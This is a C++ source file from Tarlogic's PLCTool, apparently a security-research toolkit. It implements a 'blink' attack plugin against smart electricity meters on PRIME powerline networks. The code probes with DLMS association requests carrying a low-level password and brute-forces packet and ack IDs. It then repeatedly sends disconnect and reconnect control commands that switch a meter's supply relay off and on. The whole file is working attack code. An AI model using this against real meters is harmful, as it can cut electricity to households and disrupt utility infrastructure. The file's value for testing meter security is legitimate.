//
// Copyright (c) 2020, Tarlogic Security SL
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice,
//    this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright notice,
//    this list of conditions and the following disclaimer in the documentation
//    and/or other materials provided with the distribution.
// 3. Neither the name of copyright holders nor the names of its contributors
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS”
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL COPYRIGHT HOLDERS OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//

#include "BlinkAttack.h"

#include <PLCTool/PRIME/PrimeAdapter.h>
#include <PLCTool/PRIME/PrimeFrame.h>
#include <PLCTool/Topology/Concentrator.h>
#include <PLCTool/Topology/Meter.h>
#include <PLCTool/Types/ber/ber.h>
#include <PLCTool/Types/ber/stream.h>
#include <PLCTool/Types/dlms/AarqApdu.h>
#include <PLCTool/Types/dlms/ActionRequestNormal.h>
#include <PLCTool/Types/dlms/DataArray.h>
#include <PLCTool/Types/dlms/DataInteger.h>
#include <PLCTool/Types/dlms/InitiateRequestApdu.h>
#include <PLCTool/Types/dlms/RlrqApdu.h>
#include <PLCTool/gurux/include/enums.h>
#include <PLCTool/util/defs.h>

#include <QDateTime>
#include <QObject>
#include <QTimer>
#include <cmath>
#include <string>
#include <vector>

using namespace BlinkAttackPlugin;

BlinkAttack::BlinkAttack(QString const attackName,
                         PLCTool::StringParams const &params,
                         PLCTool::PrimeAdapter *adapter, QObject *parent)
    : Attack(attackName, adapter, parent) {
  this->sna = params["SNA"].asByteVector();
  this->nid = params["NID"].asHexULong();
  this->lcid = params["LCID"].asHexULong();
  this->level = params["Switch level"].asInt();
  this->authenticationLevel = DLMS_AUTHENTICATION_LOW;
  this->password = params["Password"].asString();

  this->msTimeout = 2 * 1000 * 60;
  this->timeoutTimer = new QTimer(this);
  this->timeoutTimer->setSingleShot(true);

  this->messageTimer = new QTimer(this);

  this->cancelled = false;

  this->frame = new PLCTool::PrimeFrame(this->sna.data());

  this->connectAll();
  this->state = IDLE;
}

void BlinkAttack::connectAll(void) {
  connect(this->timeoutTimer, SIGNAL(timeout(void)), this,
          SLOT(onTimeout(void)));
  connect(this->messageTimer, SIGNAL(timeout(void)), this,
          SLOT(onMessageTime(void)));

  connect(this->adapter,
          SIGNAL(frameReceived(PLCTool::Concentrator *, QDateTime, bool,
                               const void *, size_t)),
          this,
          SLOT(onFrameReceived(PLCTool::Concentrator *, QDateTime, bool,
                               const void *, size_t)),
          Qt::BlockingQueuedConnection);

  connect(this->adapter,
          SIGNAL(dataReceived(PLCTool::Meter *, QDateTime, bool, const void *,
                              size_t)),
          this,
          SLOT(onDataReceived(PLCTool::Meter *, QDateTime, bool, const void *,
                              size_t)),
          Qt::BlockingQueuedConnection);
}

void BlinkAttack::updateProgress() {
  if (this->state == IDLE)
    emit attackProgress(0);
  else if (this->state == SEQUENCING)
    emit attackProgress(0.5);
  else if (this->state == DISCONNECTING)
    emit attackProgress(1.0);
  else if (this->state == CONNECTING)
    emit attackProgress(1.0);
}

void BlinkAttack::composeAARQ(void) {
  this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
  this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PLCTool::PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  PLCTool::AarqApdu aarq;
  PLCTool::InitiateRequestApdu initiateRequest;
  aarq.setApplicationContextName(DLMS_APPLICATION_CONTEXT_NAME_LOGICAL_NAME);
  aarq.setMechanismName(DLMS_AUTHENTICATION_LOW);
  aarq.setCallingAuthenticationValue(this->password);
  initiateRequest.setProposedDLMSVersionNumber(6);
  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_ACTION, true);
  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_EVENT_NOTIFICATION,
                                            true);
  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_SELECTIVE_ACCESS,
                                            true);
  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_SET, true);
  initiateRequest.setProposedConformanceBit(DLMS_CONFORMANCE_GET, true);
  initiateRequest.setProposedConformanceBit(
      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_ACTION, true);
  initiateRequest.setProposedConformanceBit(
      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_SET_OR_WRITE, true);
  initiateRequest.setProposedConformanceBit(
      DLMS_CONFORMANCE_BLOCK_TRANSFER_WITH_GET_OR_READ, true);
  initiateRequest.setProposedConformanceBit(
      DLMS_CONFORMANCE_PRIORITY_MGMT_SUPPORTED, true);
  initiateRequest.setClientMaxReceivePduSize(0x122);
  aarq.setUserInformation(initiateRequest.getBytes());

  this->frame->PDU.DATA = aarq.getBytes();
  this->frame->PDU.PKT.LEN = aarq.getSize() + 7;

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 2;
}

void BlinkAttack::composeDisconnect(void) {
  this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
  this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PLCTool::PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  PLCTool::ActionRequestNormal disconnectControlRequest;
  disconnectControlRequest.setInvokeId(1);
  disconnectControlRequest.setServiceClass(
      PLCTool::DLMS_METHOD_SERVICE_CLASS_CONFIRMED);
  disconnectControlRequest.setPriority(PLCTool::DLMS_METHOD_PRIORITY_HIGH);

  disconnectControlRequest.setClassId(0x0046);
  disconnectControlRequest.setInstanceId({0x00, 0x00, 0x60, 0x03, 0x0a, 0xff});
  disconnectControlRequest.setMethodId(0x01);

  PLCTool::DataArray parameters;
  parameters.insert(0, PLCTool::DataInteger(0));

  disconnectControlRequest.setMethodInvocationParameters(parameters);

  this->frame->PDU.DATA = disconnectControlRequest.getBytes();
  this->frame->PDU.PKT.LEN = disconnectControlRequest.getSize() + 7;

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void BlinkAttack::composeConnect(void) {
  this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
  this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PLCTool::PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  PLCTool::ActionRequestNormal connectControlRequest;
  connectControlRequest.setInvokeId(1);
  connectControlRequest.setServiceClass(
      PLCTool::DLMS_METHOD_SERVICE_CLASS_CONFIRMED);
  connectControlRequest.setPriority(PLCTool::DLMS_METHOD_PRIORITY_HIGH);

  connectControlRequest.setClassId(0x0046);
  connectControlRequest.setInstanceId({0x00, 0x00, 0x60, 0x03, 0x0a, 0xff});
  connectControlRequest.setMethodId(0x02);

  PLCTool::DataArray parameters;
  parameters.insert(0, PLCTool::DataInteger(0));

  this->frame->PDU.DATA = connectControlRequest.getBytes();
  this->frame->PDU.PKT.LEN = connectControlRequest.getSize() + 7;

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void BlinkAttack::composeRelease(void) {
  this->frame->PDU.macType = PLCTool::PrimeFrame::GENERIC;
  this->frame->PDU.genType = PLCTool::PrimeFrame::DATA;

  this->frame->PDU.HDR.HT = 0x0;
  this->frame->PDU.HDR.DO = 0x1;
  this->frame->PDU.HDR.LEVEL = this->level;
  this->frame->PDU.HDR.HCS = 0x39;

  this->frame->PDU.PKT.PRIO = 0x2;
  this->frame->PDU.PKT.NAD = 0x1;
  this->frame->PDU.PKT.LNID = this->nid & 0x3fff;
  this->frame->PDU.PKT.SID = this->nid >> 14;
  this->frame->PDU.PKT.LCID_CTYPE = this->lcid;

  this->frame->PDU.ARQ.PKTID = this->pktId;
  this->frame->PDU.ARQ.WINSIZE = 0x10;
  this->frame->PDU.ARQ.ACKID = this->ackId;
  this->frame->PDU.ARQ.NACKID.resize(0);
  this->frame->PDU.SAR.TYPE = PLCTool::PrimeFrame::FIRST;
  this->frame->PDU.SAR.NSEGS = 0x0;

  PLCTool::RlrqApdu rlrq;
  rlrq.setReason(DLMS_RELEASE_REQUEST_REASON_NORMAL);

  this->frame->PDU.DATA = rlrq.getBytes();
  this->frame->PDU.PKT.LEN = rlrq.getSize() + 7;

  this->frame->PDU.CL.TYPE = 0x90;
  this->frame->PDU.CL.SRC = 1;
  this->frame->PDU.CL.DEST = 1;
}

void BlinkAttack::idToSna(PLCTool::NodeId id, uint8_t *sna) {
  unsigned int i;

  for (i = 0; i < 6; ++i)
    sna[i] = (uint8_t)(id >> (5 - i) * 8);
}

bool BlinkAttack::sequencingFound(void) { return this->state == DISCONNECTING; }

bool BlinkAttack::isPacketExpected(unsigned char pktid) {
  return this->frame->PDU.ARQ.ACKID == pktid;
}

void BlinkAttack::transitionTo(State next) {
  switch (next) {
  case RELEASING:
    this->composeRelease();
    break;
  case SEQUENCING:
    this->composeAARQ();
    break;
  case CONNECTING:
    this->composeConnect();
    break;
  case DISCONNECTING:
    this->composeDisconnect();
    break;
  default:
    this->messageTimer->stop();
    if (this->cancelled)
      emit this->attackCancelled();
    break;
  }

  this->state = next;
}

//////////////////////////////////// Slots /////////////////////////////////////

void BlinkAttack::onTimeout(void) {
  this->adapter->setLcd(0, "Timeout");
  this->adapter->setLcd(1, "reached");
  this->messageTimer->stop();

  emit attackTimeout();
}

void BlinkAttack::onMessageTime(void) {
  QString status;
  switch (this->state) {
  case SEQUENCING:
    status =
        QString("AARQ probe with PKTID=%1 and ACKID=%2...")
            .arg(QString::number(this->pktId), QString::number(this->ackId));

    emit this->attackStatus(status);

    this->composeAARQ();
    this->adapter->writeFrame(this->frame->serialize());

    pktId = (pktId + 1) % 0x3f;
    ackId = (ackId + 1) % 0x3f;

    break;

  case DISCONNECTING:
    status =
        QString("AARE found with PKTID=%1 and ACKID=%2... Disconnecting..")
            .arg(QString::number(this->pktId), QString::number(this->ackId));

    emit this->attackStatus(status);

    this->adapter->writeFrame(this->frame->serialize());

    break;

  case CONNECTING:
    status =
        QString("AARE found with PKTID=%1 and ACKID=%2... Connecting..")
            .arg(QString::number(this->pktId), QString::number(this->ackId));

    emit this->attackStatus(status);

    this->adapter->writeFrame(this->frame->serialize());

    break;

  case RELEASING:
    status = QString("Releasing meter..");

    emit this->attackStatus(status);

    this->adapter->writeFrame(this->frame->serialize());
    this->transitionTo(IDLE);

    break;

  default:
    this->messageTimer->stop();
    break;
  }
}

void BlinkAttack::onFrameReceived(PLCTool::Concentrator *concentrator,
                                  QDateTime, bool downlink, const void *data,
                                  size_t size) {
  uint8_t sna[6];
  this->idToSna(concentrator->id(), sna);
  PLCTool::PrimeFrame *frame = PLCTool::PrimeFrame::fromRawData(
      sna, static_cast<const uint8_t *>(data), size);

  if (frame != nullptr && frame->PDU.macType == PLCTool::PrimeFrame::GENERIC &&
      frame->PDU.genType == PLCTool::PrimeFrame::DATA) {
    // DATA packet! Check whether it was directed to us
    bool forMe = true;

#define SAME(x) frame->PDU.x == this->frame->PDU.x
    forMe = forMe && memcmp(frame->sna, this->frame->sna, 6) == 0;
    forMe = forMe && !frame->PDU.HDR.DO; // Has to be uplink (from Meter)
    forMe = forMe && SAME(PKT.LCID_CTYPE);
    forMe = forMe && SAME(PKT.SID);
    forMe = forMe && SAME(PKT.LNID);
#undef SAME
    std::vector<uint8_t> rejection = PLCTool::hexStrToVector(
        "6129a109060760857405080101a203020101a305a10302010dbe10040e0800065f1f04"
        "00001c1d00800007");

    if (forMe) {
      if (this->sequencingFound() &&
          !this->isPacketExpected(frame->PDU.ARQ.PKTID))
        goto done;

      this->pktId = frame->PDU.ARQ.NACKID.size() > 0
                        ? static_cast<uint8_t>(frame->PDU.ARQ.NACKID[0])
                        : frame->PDU.ARQ.ACKID;
      this->ackId = frame->PDU.ARQ.PKTID + 1;

      switch (this->state) {
      case SEQUENCING:
        if (frame->PDU.DATA[0] == 0x0e || frame->PDU.DATA[0] == 0xd8) // Error
          this->transitionTo(RELEASING);
        else if (frame->PDU.DATA[0] == 0x61 && frame->PDU.DATA != rejection)
          this->transitionTo(DISCONNECTING);

        break;

      case DISCONNECTING:
        if (frame->PDU.DATA[0] == 0x0e || frame->PDU.DATA[0] == 0xd8) // Error
          this->transitionTo(RELEASING);
        else if (frame->PDU.DATA[0] == 0xc7)
          this->transitionTo(CONNECTING);

        break;

      case CONNECTING:
        if (frame->PDU.DATA[0] == 0x0e || frame->PDU.DATA[0] == 0xd8) // Error
          this->transitionTo(RELEASING);
        else if (frame->PDU.DATA[0] == 0xc7)
          this->transitionTo(DISCONNECTING);

        break;

      default:
        break;
      }

      this->timeoutTimer->stop();
    }
  }

done:
  if (frame)
    delete frame;
}

void BlinkAttack::onDataReceived(PLCTool::Meter *meter, QDateTime timeStamp,
                                 bool downlink, const void *data, size_t size) {
}

void BlinkAttack::onStart(void) {
  this->state = SEQUENCING;
  this->updateProgress();

  this->pktId = 0;
  this->ackId = 0;

  this->timeoutTimer->start(this->msTimeout);
  this->messageTimer->start(this->msMessageWait);

  this->adapter->setLcd(0, "Sending AARQ");
  this->adapter->setLcd(1, "probes");

  emit attackStarted();
}

void BlinkAttack::onCancel(void) {
  this->timeoutTimer->stop();
  this->transitionTo(RELEASING);

  this->adapter->setLcd(0, "Attack");
  this->adapter->setLcd(1, "cancelled");

  this->cancelled = true;
}

void BlinkAttack::onEnd(void) {
  this->timeoutTimer->stop();
  this->messageTimer->stop();

  emit attackEnded();
}
